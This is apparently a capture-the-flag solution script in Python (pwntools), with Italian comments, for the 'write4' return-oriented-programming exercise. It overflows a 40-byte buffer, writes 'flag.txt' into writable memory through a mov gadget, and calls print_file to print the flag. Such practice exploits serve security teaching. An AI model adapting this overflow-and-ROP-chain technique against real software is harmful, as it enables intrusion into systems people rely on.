from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")
# context.binary = elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 40

elf = context.binary = ELF("./write4")

rop = ROP([elf])

p = elf.process()

# pprint(elf.symbols)
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()

where_to_write = int(hex(0x601028),0) # sezione trovata con readelf, .data  -> privilegi WA (write)
mov_gadget = int(hex(0x400628),0) # trovato con ROPgadget 

log.info(f"Trovato gadget [mov [r14], r15; ret;] al seguente indirizzo : {hex(mov_gadget)}")
log.info(f"Indirizzo su cui possiamo scrivere in memoria : {hex(where_to_write)}")

rop.r14 = where_to_write
rop.r15 = "flag.txt"
rop.raw(mov_gadget)
rop.rdi = where_to_write
rop.raw(elf.symbols["print_file"])

# rop.call("print_file". where_to_write) # soluzione alternativa alla rop.rdi + rop.raw

payload = [    
    b"A" * offset, 
    rop.chain()
]

payload = b"".join(payload)

p.send(payload)

# print(rop.dump())

p.recvline()

flag = p.recvline()

log.info(f"Questa Ã¨ la flag : {flag.decode('utf-8')}")

# libc = elf.libc

# p = connect('spclr.ch', 1337)
